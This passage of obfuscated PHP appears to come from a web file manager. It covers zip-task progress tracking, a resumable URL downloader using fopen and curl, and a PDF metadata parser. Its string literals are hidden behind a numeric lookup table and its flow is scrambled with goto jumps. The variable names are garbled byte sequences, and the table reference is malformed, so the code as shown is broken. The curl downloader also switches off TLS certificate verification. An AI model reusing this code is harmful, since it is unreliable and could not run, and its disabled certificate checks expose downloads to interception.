$d¤œ¡ãÅ¦¢ = $_SERVER[“][1737] . base64_encode($d“ëÉ»é‘); return exif_read_data($d¤œ¡ãÅ¦¢, $B¤šß†Ãª, $D±æÓ²Ã», $fƒ†¾ÁÃæ); } function getimagesize_io($Eä½š’Ì´¬, &$d¤Å…®ÈçÀ = false) { $A½¡ñšĞ¢ã = StreamWrapperIO::read($Eä½š’Ì´¬, 0, 1024 * 64); $Eä½š’Ì´¬ = $_SERVER[“][1737] . base64_encode($A½¡ñšĞ¢ã); return getimagesize($Eä½š’Ì´¬, $d¤Å…®ÈçÀ); } goto E±áÁ½ğáÚ; E‡İîöö¬Ä: class TaskZip extends TaskFileTransfer { protected function startAfter() { $f¦·ßÉç™Æ =& $_SERVER[“]; parent::startAfter(); Hook::bind($f¦·ßÉç™Æ[1499], array($this, $f¦·ßÉç™Æ[1494])); $f›ÉÔå¬Å =& $this->task; $f›ÉÔå¬Å[$f¦·ßÉç™Æ[1496]] = $f¦·ßÉç™Æ[1027]; if (!$f›ÉÔå¬Å[$f¦·ßÉç™Æ[1328]]) { $f›ÉÔå¬Å[$f¦·ßÉç™Æ[1328]] = LNG($f¦·ßÉç™Æ[1500]); } } protected function endAfter() { $AæÇ…‡Ã =& $_SERVER[“]; parent::endAfter(); Hook::unbind($AæÇ…‡Ã[1499], array($this, $AæÇ…‡Ã[1494])); } public function updateAfter() { $BÈùº»ÈÌŒ =& $_SERVER[“]; $bì¨†É—°ê =& $this->task; if (!$bì¨†É—°ê[$BÈùº»ÈÌŒ[963]] || !$bì¨†É—°ê[$BÈùº»ÈÌŒ[682]]) { return; } if ($bì¨†É—°ê[$BÈùº»ÈÌŒ[1496]] == $BÈùº»ÈÌŒ[1027]) { $bà³·ÌÆƒÉ = $bì¨†É—°ê[$BÈùº»ÈÌŒ[1469]]; if ($bì¨†É—°ê[$BÈùº»ÈÌŒ[1470]] != $BÈùº»ÈÌŒ[1027]) { $bà³·ÌÆƒÉ = 0; } $e¼ŠÇÕÙ¬ç = ($bì¨†É—°ê[$BÈùº»ÈÌŒ[1473]] + $bà³·ÌÆƒÉ) / $bì¨†É—°ê[$BÈùº»ÈÌŒ[682]]; $bì¨†É—°ê[$BÈùº»ÈÌŒ[1424]] = $e¼ŠÇÕÙ¬ç * 0.3; } else { if ($bì¨†É—°ê[$BÈùº»ÈÌŒ[1496]] == $BÈùº»ÈÌŒ[301]) { $e¼ŠÇÕÙ¬ç = $bì¨†É—°ê[$BÈùº»ÈÌŒ[977]] / $bì¨†É—°ê[$BÈùº»ÈÌŒ[963]]; $bì¨†É—°ê[$BÈùº»ÈÌŒ[1424]] = 0.3 + $e¼ŠÇÕÙ¬ç * 0.5; } else { if ($bì¨†É—°ê[$BÈùº»ÈÌŒ[1496]] == $BÈùº»ÈÌŒ[103]) { $e¼ŠÇÕÙ¬ç = 0; if ($bì¨†É—°ê[$BÈùº»ÈÌŒ[1468]]) { $e¼ŠÇÕÙ¬ç = $bì¨†É—°ê[$BÈùº»ÈÌŒ[1469]] / $bì¨†É—°ê[$BÈùº»ÈÌŒ[1468]]; } $bì¨†É—°ê[$BÈùº»ÈÌŒ[1424]] = 0.3 + 0.5 + $e¼ŠÇÕÙ¬ç * 0.2; } } } if ($bì¨†É—°ê[$BÈùº»ÈÌŒ[1424]] > 0) { $EÙ²–Ÿ‡ò’ = timeFloat() - $bì¨†É—°ê[$BÈùº»ÈÌŒ[1426]] - $bì¨†É—°ê[$BÈùº»ÈÌŒ[1429]]; $bì¨†É—°ê[$BÈùº»ÈÌŒ[1430]] = $EÙ²–Ÿ‡ò’ * (1 - $bì¨†É—°ê[$BÈùº»ÈÌŒ[1424]]) / $bì¨†É—°ê[$BÈùº»ÈÌŒ[1424]]; } } public function copyFileStart($C†Ğ— ‹Ê, $BùÛ†ÔõÜ°, $BµÛŠà‚°, $B»ß–’áÔ©, $eä‡¹»Ë¶å, $D·Ö¶…Ì) { $B÷ªßÌ²ñ‘ =& $_SERVER[“]; parent::copyFileStart($C†Ğ— ‹Ê, $BùÛ†ÔõÜ°, $BµÛŠà‚°, $B»ß–’áÔ©, $eä‡¹»Ë¶å, $D·Ö¶…Ì); $E¦òäÑª’ =& $this->task; if ($E¦òäÑª’[$B÷ªßÌ²ñ‘[1496]] == $B÷ªßÌ²ñ‘[301]) { $E¦òäÑª’[$B÷ªßÌ²ñ‘[1496]] = $B÷ªßÌ²ñ‘[103]; } $this->update(); } public function copyFileEnd($Cµ½›…ã¬, $Cºœ¯Ü¹Î•, $Fğ¸Ë®À×“, $eÌŠƒ÷Ïó, $a½¹Û È¸ó, $Eë‘ÀÈ­) { $F¸¹¢àØÛ• =& $_SERVER[“]; $cÚÅˆ®ßñ” =& $this->task; $cÚÅˆ®ßñ”[$F¸¹¢àØÛ•[1469]] = $cÚÅˆ®ßñ”[$F¸¹¢àØÛ•[1468]]; $cÚÅˆ®ßñ”[$F¸¹¢àØÛ•[1473]] += $cÚÅˆ®ßñ”[$F¸¹¢àØÛ•[1468]]; $cÚÅˆ®ßñ”[$F¸¹¢àØÛ•[1470]] = $F¸¹¢àØÛ•[33]; $this->update(); } public function nameParse($F¦Äá³¹¾É) { $bÀ©ßó•ë =& $_SERVER[“]; $DÔÌ¶£¶¶Š =& $this->task; if ($DÔÌ¶£¶¶Š[$bÀ©ßó•ë[977]] < $DÔÌ¶£¶¶Š[$bÀ©ßó•ë[963]]) { $A‹Óè¶…•î = get_path_this($F¦Äá³¹¾É); if (strstr($A‹Óè¶…•î, $bÀ©ßó•ë[91])) { $DÔÌ¶£¶¶Š[$bÀ©ßó•ë[977]] += 1; } } if ($DÔÌ¶£¶¶Š[$bÀ©ßó•ë[1496]] == $bÀ©ßó•ë[1027]) { $DÔÌ¶£¶¶Š[$bÀ©ßó•ë[1496]] = $bÀ©ßó•ë[301]; } $DÔÌ¶£¶¶Š[$bÀ©ßó•ë[1466]] = $F¦Äá³¹¾É; $this->update(); } } class Downloader { static function start($fŠšÓŸÍæ, $e¸…ò¶øíï, $CŠƒ©‚”Ä® = 10) { goto A„ŞŒĞîÑ; F¸¢œÄ¢‰‚: if (is_file($EÂ¦Ø„ñ†¯)) { $DÈÔ²°® é = file_get_contents($EÂ¦Ø„ñ†¯); $C‡Ï·‡¶» = json_decode($DÈÔ²°® é, 1); } if (file_exists($e¸…ò¶øíï) && $fëï¯Ò²ŒÉ == filesize($e¸…ò¶øíï)) { @unlink($bâ®ŠËÛëõ); @unlink($EÂ¦Ø„ñ†¯); return array($e¹çÇİä™ƒ[1019] => !0, $e¹çÇİä™ƒ[1021] => $e¹çÇİä™ƒ[1504]); } if ($C‡Ï·‡¶»[$e¹çÇİä™ƒ[325]] != $fëï¯Ò²ŒÉ) { $C‡Ï·‡¶» = array($e¹çÇİä™ƒ[325] => $fëï¯Ò²ŒÉ); } goto a¢ÙÑ¬©³; f»íáè¦à: if (!$fŠšÓŸÍæ) { return array($e¹çÇİä™ƒ[1019] => !1, $e¹çÇİä™ƒ[1021] => $e¹çÇİä™ƒ[1024]); } if (!$C‹ĞÒ‹Æè…[$e¹çÇİä™ƒ[1275]] || $C‹ĞÒ‹Æè…[$e¹çÇİä™ƒ[325]] == 0) { @unlink($bâ®ŠËÛëõ); @unlink($e¸…ò¶øíï); $fˆ«°ßƒô = self::fileDownloadFopen($fŠšÓŸÍæ, $e¸…ò¶øíï, $C‹ĞÒ‹Æè…[$e¹çÇİä™ƒ[325]]); if ($fˆ«°ßƒô[$e¹çÇİä™ƒ[1019]]) { return $fˆ«°ßƒô; } else { @unlink($bâ®ŠËÛëõ); @unlink($e¸…ò¶øíï); $fˆ«°ßƒô = self::fileDownloadCurl($fŠšÓŸÍæ, $e¸…ò¶øíï, !1, 0, $C‹ĞÒ‹Æè…[$e¹çÇİä™ƒ[325]]); @unlink($bâ®ŠËÛëõ); return $fˆ«°ßƒô; } } $aèã±¢öëÇ = is_file($bâ®ŠËÛëõ) ? filesize($bâ®ŠËÛëõ) : 0; goto a· Øçæâõ; A„ŞŒĞîÑ: $e¹çÇİä™ƒ =& $_SERVER[“]; if (!request_url_safe($fŠšÓŸÍæ)) { return array($e¹çÇİä™ƒ[1019] => !1, $e¹çÇİä™ƒ[1021] => $e¹çÇİä™ƒ[1024]); } $EÂ¦Ø„ñ†¯ = $e¸…ò¶øíï . $e¹çÇİä™ƒ[1501]; goto a³«œ¥¯Î; a· Øçæâõ: $fëï¯Ò²ŒÉ = intval($C‹ĞÒ‹Æè…[$e¹çÇİä™ƒ[325]]); if (file_exists($bâ®ŠËÛëõ) && time() - filemtime($bâ®ŠËÛëõ) < 3) { return array($e¹çÇİä™ƒ[1019] => !1, $e¹çÇİä™ƒ[1021] => $e¹çÇİä™ƒ[1503]); } $C‡Ï·‡¶» = array(); goto F¸¢œÄ¢‰‚; a³«œ¥¯Î: $bâ®ŠËÛëõ = $e¸…ò¶øíï . $e¹çÇİä™ƒ[1502]; if (is_array($fŠšÓŸÍæ)) { $C‹ĞÒ‹Æè… = $fŠšÓŸÍæ; } else { $C‹ĞÒ‹Æè… = url_header($fŠšÓŸÍæ); } $fŠšÓŸÍæ = $C‹ĞÒ‹Æè…[$e¹çÇİä™ƒ[295]]; goto f»íáè¦à; a¢ÙÑ¬©³: if ($aèã±¢öëÇ > $fëï¯Ò²ŒÉ) { @unlink($bâ®ŠËÛëõ); } file_put_contents($EÂ¦Ø„ñ†¯, json_encode($C‡Ï·‡¶»)); $fˆ«°ßƒô = self::fileDownloadCurl($fŠšÓŸÍæ, $e¸…ò¶øíï, !0, $aèã±¢öëÇ, $fëï¯Ò²ŒÉ); goto Dç©á„·Å; Dç©á„·Å: if ($fˆ«°ßƒô[$e¹çÇİä™ƒ[1019]]) { @unlink($EÂ¦Ø„ñ†¯); } return $fˆ«°ßƒô; goto C·ºÕÑˆ³; C·ºÕÑˆ³: } static function fileDownloadFopen($eİ‡äêÏ¿¶, $aÛŒŒã©°, $e·¹µŸäÈî = 0) { $E¢î¥—®Ì¥ =& $_SERVER[“]; @ini_set($E¢î¥—®Ì¥[1505], $E¢î¥—®Ì¥[1506]); $bİ‹‹­íØÑ = $aÛŒŒã©° . $E¢î¥—®Ì¥[1502]; set_timeout(); @unlink($bİ‹‹­íØÑ); if ($b‡ëÌ­­»› = @fopen($eİ‡äêÏ¿¶, $E¢î¥—®Ì¥[1507])) { goto B¥›îå¥Å; eÙ«Ã£íó: fclose($b‡ëÌ­­»›); self::checkGzip($bİ‹‹­íØÑ); if (!@rename($bİ‹‹­íØÑ, $aÛŒŒã©°)) { usleep(round(rand(0, 1000) * 50)); @unlink($aÛŒŒã©°); $f»ƒ™°ÛÜâ = @rename($bİ‹‹­íØÑ, $aÛŒŒã©°); if (!$f»ƒ™°ÛÜâ) { return array($E¢î¥—®Ì¥[1019] => !1, $E¢î¥—®Ì¥[1021] => $E¢î¥—®Ì¥[1511]); } } goto CÉ¥Û›ƒ‹Ù; CÉ¥Û›ƒ‹Ù: return array($E¢î¥—®Ì¥[1019] => !0, $E¢î¥—®Ì¥[1021] => $E¢î¥—®Ì¥[680]); goto cÕïê¾øŸà; B¥›îå¥Å: if (!($F‰£¬ŞÂŠ½ = @fopen($bİ‹‹­íØÑ, $E¢î¥—®Ì¥[1508]))) { return array($E¢î¥—®Ì¥[1019] => !1, $E¢î¥—®Ì¥[1021] => $E¢î¥—®Ì¥[1509]); } while (!feof($b‡ëÌ­­»›)) { if (!file_exists($bİ‹‹­íØÑ)) { fclose($F‰£¬ŞÂŠ½); return array($E¢î¥—®Ì¥[1019] => !1, $E¢î¥—®Ì¥[1021] => $E¢î¥—®Ì¥[1510]); } clearstatcache(); if ($e·¹µŸäÈî > 0 && $e·¹µŸäÈî == filesize(iconv_system($bİ‹‹­íØÑ))) { break; } fwrite($F‰£¬ŞÂŠ½, fread($b‡ëÌ­­»›, 1024 * 8), 1024 * 8); } fclose($F‰£¬ŞÂŠ½); goto eÙ«Ã£íó; cÕïê¾øŸà: } else { return array($E¢î¥—®Ì¥[1019] => !1, $E¢î¥—®Ì¥[1021] => $E¢î¥—®Ì¥[1512]); } } static function fileDownloadCurl($FÑ”ÕÑèˆÈ, $FàËİ‡Ú“â, $BçÛ¨Óâà× = false, $D´—Ù‘Õê’ = 0, $DÜòÔ‡Øãí = 0) { goto bÖŞé‘¸¸ï; AèâšÌ†á¯: $cØƒĞ÷—á = @fopen($E˜ˆ…á¯ÜŠ, $Aª¦œÇò°×[967]); if (!$cØƒĞ÷—á) { return array($Aª¦œÇò°×[1019] => !1, $Aª¦œÇò°×[1021] => $Aª¦œÇò°×[1513]); } $d‚ ¦ùîŸ = curl_init($FÑ”ÕÑèˆÈ); goto A¿§…ËåÚ; E«‹ôˆ’…: curl_setopt($d‚ ¦ùîŸ, CURLOPT_NOPROGRESS, !1); curl_setopt($d‚ ¦ùîŸ, CURLOPT_PROGRESSFUNCTION, $Aª¦œÇò°×[1514]); curl_progress_start($d‚ ¦ùîŸ); goto e½£×Æ¾‘‹; bÖŞé‘¸¸ï: $Aª¦œÇò°× =& $_SERVER[“]; $E˜ˆ…á¯ÜŠ = $FàËİ‡Ú“â . $Aª¦œÇò°×[1502]; set_timeout(); goto AèâšÌ†á¯; A¿§…ËåÚ: if ($BçÛ¨Óâà×) { curl_setopt($d‚ ¦ùîŸ, CURLOPT_RANGE, $D´—Ù‘Õê’ . $Aª¦œÇò°×[699]); } curl_setopt($d‚ ¦ùîŸ, CURLOPT_FILE, $cØƒĞ÷—á); curl_setopt($d‚ ¦ùîŸ, CURLOPT_REFERER, get_url_link($FÑ”ÕÑèˆÈ)); goto AÃµ®İ†çğ; AÃµ®İ†çğ: curl_setopt($d‚ ¦ùîŸ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($d‚ ¦ùîŸ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($d‚ ¦ùîŸ, CURLOPT_SSL_VERIFYHOST, 0); goto E«‹ôˆ’…; B“Ø¯š®ß¼: if ($BÑ°­Ñ²Ô× < $DÜòÔ‡Øãí && $DÜòÔ‡Øãí != 0) { return array($Aª¦œÇò°×[1019] => !1, $Aª¦œÇò°×[1021] => $Aª¦œÇò°×[1503]); } if ($e±«ÒòÛˆ† && filesize($E˜ˆ…á¯ÜŠ) != 0) { self::checkGzip($E˜ˆ…á¯ÜŠ); if (!@rename($E˜ˆ…á¯ÜŠ, $FàËİ‡Ú“â)) { @unlink($FàËİ‡Ú“â); $e±«ÒòÛˆ† = @rename($E˜ˆ…á¯ÜŠ, $FàËİ‡Ú“â); if (!$e±«ÒòÛˆ†) { return array($Aª¦œÇò°×[1019] => !1, $Aª¦œÇò°×[1021] => $Aª¦œÇò°×[1515]); } } return array($Aª¦œÇò°×[1019] => !0, $Aª¦œÇò°×[1021] => $Aª¦œÇò°×[680]); } return array($Aª¦œÇò°×[1019] => !1, $Aª¦œÇò°×[1021] => $Aª¦œÇò°×[1516]); goto fƒÅÇÏó; e½£×Æ¾‘‹: curl_setopt($d‚ ¦ùîŸ, CURLOPT_USERAGENT, $Aª¦œÇò°×[1506]); $e±«ÒòÛˆ† = curl_exec($d‚ ¦ùîŸ); curl_progress_end($d‚ ¦ùîŸ); goto E ì¡‚ “œ; E ì¡‚ “œ: curl_close($d‚ ¦ùîŸ); fclose($cØƒĞ÷—á); $BÑ°­Ñ²Ô× = filesize(iconv_system($E˜ˆ…á¯ÜŠ)); goto B“Ø¯š®ß¼; fƒÅÇÏó: } static function checkGzip($då ‘’¶ì) { goto F­õá§ï‰¡; díáÓôĞœÄ: ob_start(); readgzfile($då ‘’¶ì); $DÉ‡™¢± … = ob_get_clean(); goto Bçîƒ Æ‚‚; Bçîƒ Æ‚‚: file_put_contents($då ‘’¶ì, $DÉ‡™¢± …); goto f„‚¸Ü¹Ü; F­õá§ï‰¡: $f±íè¸„éã = $_SERVER[“][1517]; $aÑÅšÑ‚™Ì = file_sub_str($då ‘’¶ì, 0, 2); if ($f±íè¸„éã != $aÑÅšÑ‚™Ì) { return; } goto díáÓôĞœÄ; f„‚¸Ü¹Ü: } } class FileParsePdf { public static function parse($f«âÖ×éªñ) { goto b¤¬÷Ÿœø; c¤ŞœÌÏë: preg_match_all($a¶¼àƒªÑ§, $bÛ–Å„±ÂÓ[$aˆà…³¹ßå[1519]], $bÉÀí´Ííò); if ($bÉÀí´Ííò[1] && $a‚Åó—Ò Í[$aˆà…³¹ßå[1526]] < $bÉÀí´Ííò[1][0]) { $a‚Åó—Ò Í[$aˆà…³¹ßå[1526]] = $bÉÀí´Ííò[1][0]; } preg_match_all($a¶¼àƒªÑ§, $bÛ–Å„±ÂÓ[$aˆà…³¹ßå[1520]], $bÉÀí´Ííò); goto E”µ©À“†; bØ§¤Ñ…Û¥: if ($bÉÀí´Ííò) { $a‚Åó—Ò Í[$aˆà…³¹ßå[1327]] = $bÉÀí´Ííò[1]; } $a‚Åó—Ò Í[$aˆà…³¹ßå[1526]] = 0; $a¶¼àƒªÑ§ = $aˆà…³¹ßå[1527]; goto c¤ŞœÌÏë; c£·•ø‹³É: if ($bÆÍ¸„Í–) { $f™«ç–«©ò = $bÆÍ¸„Í–[$aˆà…³¹ßå[1521]][$aˆà…³¹ßå[1179]]; $a‚Åó—Ò Í = self::getObjectValue($bÛ–Å„±ÂÓ, $bÆÍ¸„Í–, $f™«ç–«©ò); } $a‚Åó—Ò Í = is_array($a‚Åó—Ò Í) ? $a‚Åó—Ò Í : array(); $a‚Åó—Ò Í[$aˆà…³¹ßå[1522]] = 0; goto C»¾Èï‘Ó; FØ‘’‚šŠ: $bÛ–Å„±ÂÓ[$aˆà…³¹ßå[1519]] = StreamWrapperIO::read($f«âÖ×éªñ, 0, $F°¦¶‹…¦µ); $bÛ–Å„±ÂÓ[$aˆà…³¹ßå[1520]] = StreamWrapperIO::read($f«âÖ×éªñ, $bÛ–Å„±ÂÓ[$aˆà…³¹ßå[77]] - $F°¦¶‹…¦µ, $F°¦¶‹…¦µ); $bÆÍ¸„Í– = self::decodeXref($bÛ–Å„±ÂÓ); goto c£·•ø‹³É; b¤¬÷Ÿœø: $aˆà…³¹ßå =& $_SERVER[“]; $F°¦¶‹…¦µ = 32 * 1024; $bÛ–Å„±ÂÓ = array($aˆà…³¹ßå[760] => fopen($f«âÖ×éªñ, $aˆà…³¹ßå[1157]), $aˆà…³¹ßå[75] => $f«âÖ×éªñ, $aˆà…³¹ßå[77] => filesize($f«âÖ×éªñ), $aˆà…³¹ßå[1518] => $F°¦¶‹…¦µ); goto FØ‘’‚šŠ; C»¾Èï‘Ó: $a¶¼àƒªÑ§ = $aˆà…³¹ßå[1523]; preg_match($a¶¼àƒªÑ§, $bÛ–Å„±ÂÓ[$aˆà…³¹ßå[1519]], $bÉÀí´Ííò); if (!$a‚Åó—Ò Í[$aˆà…³¹ßå[1522]] && count($bÉÀí´Ííò) == 5) { $a‚Åó—Ò Í[$aˆà…³¹ßå[1522]] = $bÉÀí´Ííò[3]; $a‚Åó—Ò Í[$aˆà…³¹ßå[1524]] = $bÉÀí´Ííò[4]; } goto D”ÍÇöçá; D”ÍÇöçá: preg_match($a¶¼àƒªÑ§, $bÛ–Å„±ÂÓ[$aˆà…³¹ßå[1520]], $bÉÀí´Ííò); if (!$a‚Åó—Ò Í[$aˆà…³¹ßå[1522]] && count($bÉÀí´Ííò) == 5) { $a‚Åó—Ò Í[$aˆà…³¹ßå[1522]] = $bÉÀí´Ííò[3]; $a‚Åó—Ò Í[$aˆà…³¹ßå[1524]] = $bÉÀí´Ííò[4]; } preg_match($aˆà…³¹ßå[1525], $bÛ–Å„±ÂÓ[$aˆà…³¹ßå[1519]], $bÉÀí´Ííò); goto bØ§¤Ñ…Û¥; E”µ©À“†: if ($bÉÀí´Ííò[1] && $a‚Åó—Ò Í[$aˆà…³¹ßå[1526]] < $bÉÀí´Ííò[1][0]) { $a‚Åó—Ò Í[$aˆà…³¹ßå[1526]] = $bÉÀí´Ííò[1][0]; } $a‚Åó—Ò Í = self::parseInfoItem($a‚Åó—Ò Í); return $a‚Åó—Ò Í; goto açÌĞœØ†; açÌĞœØ†: } private static function parseInfoItem($BêˆÚ¡í“) { $FÍ§æÑ¤Î— =& $_SERVER[“]; if (!$BêˆÚ¡í“) { return !1; } $c˜ˆ–¦êÍõ = array($FÍ§æÑ¤Î—[1328] => array($FÍ§æÑ¤Î—[1528], $FÍ§æÑ¤Î—[33]), $FÍ§æÑ¤Î—[1529] => array($FÍ§æÑ¤Î—[1530], $FÍ§æÑ¤Î—[33]), $FÍ§æÑ¤Î—[187] => array($FÍ§æÑ¤Î—[1531], $FÍ§æÑ¤Î—[210]), $FÍ§æÑ¤Î—[107] => array($FÍ§æÑ¤Î—[1532], $FÍ§æÑ¤Î—[210]), $FÍ§æÑ¤Î—[1526] => array($FÍ§æÑ¤Î—[1526], $FÍ§æÑ¤Î—[276]), $FÍ§æÑ¤Î—[1522] => array($FÍ§æÑ¤Î—[1522], $FÍ§æÑ¤Î—[276]), $FÍ§æÑ¤Î—[1524] => array($FÍ§æÑ¤Î—[1524], $FÍ§æÑ¤Î—[276]), $FÍ§æÑ¤Î—[1533] => array($FÍ§æÑ¤Î—[1534], $FÍ§æÑ¤Î—[33]), $FÍ§æÑ¤Î—[1535] => array($FÍ§æÑ¤Î—[1536], $FÍ§æÑ¤Î—[33]), $FÍ§æÑ¤Î—[1537] => array($FÍ§æÑ¤Î—[1327], $FÍ§æÑ¤Î—[33])); $d°Šõ¨ëä« = array(); foreach ($c˜ˆ–¦êÍõ as $DÏáÃ£ÑãÕ => $aäÎêâÏ³) { if (!isset($BêˆÚ¡í“[$aäÎêâÏ³[0]])) { continue; } $cÁ¤ô¥ÒÖĞ = $BêˆÚ¡í“[$aäÎêâÏ³[0]]; if (!$cÁ¤ô¥ÒÖĞ || is_array($cÁ¤ô¥ÒÖĞ)) { continue; } switch ($aäÎêâÏ³[1]) { case $FÍ§æÑ¤Î—[276]: $cÁ¤ô¥ÒÖĞ = intval($cÁ¤ô¥ÒÖĞ); break; case $FÍ§æÑ¤Î—[210]: if (substr($cÁ¤ô¥ÒÖĞ, 0, 2) == $FÍ§æÑ¤Î—[1538]) { $cÁ¤ô¥ÒÖĞ = substr($cÁ¤ô¥ÒÖĞ, 2, 14); } if (strtotime($cÁ¤ô¥ÒÖĞ)) { $cÁ¤ô¥ÒÖĞ = date($FÍ§æÑ¤Î—[1539], strtotime($cÁ¤ô¥ÒÖĞ)); } break; } $d°Šõ¨ëä«[$DÏáÃ£ÑãÕ] = $cÁ¤ô¥ÒÖĞ; } return $d°Šõ¨ëä«; } private static function decodeXref(&$Bİ‚İËÑ–) { goto añ½¸¨¹ä¤; bŠ‹™™œ: $Eš¥‹Íš‘ï = $F¨ˆ§×Ş­†[1541]; if (!preg_match_all($Eš¥‹Íš‘ï, $C‚´½ïˆÊÜ, $AŒÃ®™ó‹Ì, PREG_SET_ORDER, 0)) { return !1; } $bËº÷—Ù¢ = intval($AŒÃ®™ó‹Ì[0][1]); goto B³Íß¯¿‹¥; añ½¸¨¹ä¤: $F¨ˆ§×Ş­† =& $_SERVER[“]; $C‚´½ïˆÊÜ = $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[1520]]; $EëÔ©¨ŸÏ = array($F¨ˆ§×Ş­†[1521] => array(), $F¨ˆ§×Ş­†[1540] => array()); goto bŠ‹™™œ; FŸÁòİ”ë¤: if (preg_match($F¨ˆ§×Ş­†[1554], $cğ¸äƒ”è¸, $AŒÃ®™ó‹Ì) > 0) { } return $EëÔ©¨ŸÏ; goto CÍ‚¡ÛÛ¹Å; c°áÁ…Û: if (preg_match($F¨ˆ§×Ş­†[1552], $cğ¸äƒ”è¸, $AŒÃ®™ó‹Ì) > 0) { $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1521]][$F¨ˆ§×Ş­†[1179]] = intval($AŒÃ®™ó‹Ì[1]) . $F¨ˆ§×Ş­†[70] . intval($AŒÃ®™ó‹Ì[2]); } if (preg_match($F¨ˆ§×Ş­†[1553], $cğ¸äƒ”è¸, $AŒÃ®™ó‹Ì) > 0) { $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1521]][$F¨ˆ§×Ş­†[367]] = array(); $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1521]][$F¨ˆ§×Ş­†[367]][0] = $AŒÃ®™ó‹Ì[1]; $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1521]][$F¨ˆ§×Ş­†[367]][1] = $AŒÃ®™ó‹Ì[2]; } if (!$EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1521]][$F¨ˆ§×Ş­†[1179]]) { return !1; } goto FŸÁòİ”ë¤; dùÅ÷ß‰Ç£: foreach ($AŒÃ®™ó‹Ì[3] as $F‘é¯·¦Ï => $aè’åè„«Š) { if ($AŒÃ®™ó‹Ì[3][$F‘é¯·¦Ï] == $F¨ˆ§×Ş­†[1543]) { $aÆ‹ãºƒ Ü = $aÄ£­ØèàÒ . $F¨ˆ§×Ş­†[70] . intval($AŒÃ®™ó‹Ì[2][$F‘é¯·¦Ï]); $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1540]][$aÆ‹ãºƒ Ü] = intval($AŒÃ®™ó‹Ì[1][$F‘é¯·¦Ï]); ++$aÄ£­ØèàÒ; } else { if ($AŒÃ®™ó‹Ì[3][$F‘é¯·¦Ï] == $F¨ˆ§×Ş­†[1544]) { ++$aÄ£­ØèàÒ; } else { } } } if (preg_match_all($F¨ˆ§×Ş­†[1545], $C‚´½ïˆÊÜ, $AŒÃ®™ó‹Ì)) { $Böà‚³†»› = $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[77]] - $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[1518]]; foreach ($AŒÃ®™ó‹Ì[0] as $F‘é¯·¦Ï => $c¤Ê‘º•Ïã) { $c¢©‚É›¯Ò = $AŒÃ®™ó‹Ì[1][$F‘é¯·¦Ï] . $F¨ˆ§×Ş­†[70] . $AŒÃ®™ó‹Ì[2][$F‘é¯·¦Ï]; $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1540]][$c¢©‚É›¯Ò] = strpos($C‚´½ïˆÊÜ, $c¤Ê‘º•Ïã) + $Böà‚³†»› + 1; } } if (preg_match_all($F¨ˆ§×Ş­†[1546], $C‚´½ïˆÊÜ, $AŒÃ®™ó‹Ì)) { $cğ¸äƒ”è¸ = count($AŒÃ®™ó‹Ì[1]) == 1 ? $AŒÃ®™ó‹Ì[1][0] : $AŒÃ®™ó‹Ì[1][1]; } else { $cğ¸äƒ”è¸ = substr($C‚´½ïˆÊÜ, -1024 * 5); } goto E¨ôÕ¢Ïº; B³Íß¯¿‹¥: if ($Bİ‚İËÑ–[$F¨ˆ§×Ş­†[77]] - $bËº÷—Ù¢ > $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[1518]]) { $F‘×š¼¥ = 4 * $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[1518]]; $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[1518]] = $F‘×š¼¥; $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[1519]] = StreamWrapperIO::read($Bİ‚İËÑ–[$F¨ˆ§×Ş­†[75]], 0, $F‘×š¼¥); $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[1520]] = StreamWrapperIO::read($Bİ‚İËÑ–[$F¨ˆ§×Ş­†[75]], $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[77]] - $F‘×š¼¥, $F‘×š¼¥); $C‚´½ïˆÊÜ = $Bİ‚İËÑ–[$F¨ˆ§×Ş­†[1520]]; } $aÄ£­ØèàÒ = 0; preg_match_all($F¨ˆ§×Ş­†[1542], $C‚´½ïˆÊÜ, $AŒÃ®™ó‹Ì); goto dùÅ÷ß‰Ç£; E¨ôÕ¢Ïº: if (preg_match($F¨ˆ§×Ş­†[1547], $cğ¸äƒ”è¸, $AŒÃ®™ó‹Ì) > 0) { $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1521]][$F¨ˆ§×Ş­†[77]] = intval($AŒÃ®™ó‹Ì[1]); } if (preg_match($F¨ˆ§×Ş­†[1548], $cğ¸äƒ”è¸, $AŒÃ®™ó‹Ì) > 0) { $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1521]][$F¨ˆ§×Ş­†[1549]] = intval($AŒÃ®™ó‹Ì[1]) . $F¨ˆ§×Ş­†[70] . intval($AŒÃ®™ó‹Ì[2]); } if (preg_match($F¨ˆ§×Ş­†[1550], $cğ¸äƒ”è¸, $AŒÃ®™ó‹Ì) > 0) { $EëÔ©¨ŸÏ[$F¨ˆ§×Ş­†[1521]][$F¨ˆ§×Ş­†[1551]] = intval($AŒÃ®™ó‹Ì[1]) . $F¨ˆ§×Ş­†[70] . intval($AŒÃ®™ó‹Ì[2]); } goto c°áÁ…Û; CÍ‚¡ÛÛ¹Å: } private static function getObjectValue($F¥íÌØî¹¶, $f”Ñøë¾ËÕ, $aø»è‡æ¶§) { goto C£ˆÄŸ“ä…; eŞ˜‡‰„Âò: return $d‘¨Æ£îÒ; goto bÙ±»»ïß; F¸øÕî†²: if (!is_array($E‹á…òˆ¹[1])) { return array(); } $d‘¨Æ£îÒ = array(); for ($bó¶Û³ïÅ = 0; $bó¶Û³ïÅ < count($E‹á…òˆ¹[1]); $bó¶Û³ïÅ += 2) { $BÔÂŠŠÌ¶Å = $E‹á…òˆ¹[1][$bó¶Û³ïÅ]; $BğÄ«ğÛ¨» = $E‹á…òˆ¹[1][$bó¶Û³ïÅ + 1]; if (count($BÔÂŠŠÌ¶Å) == 3 && 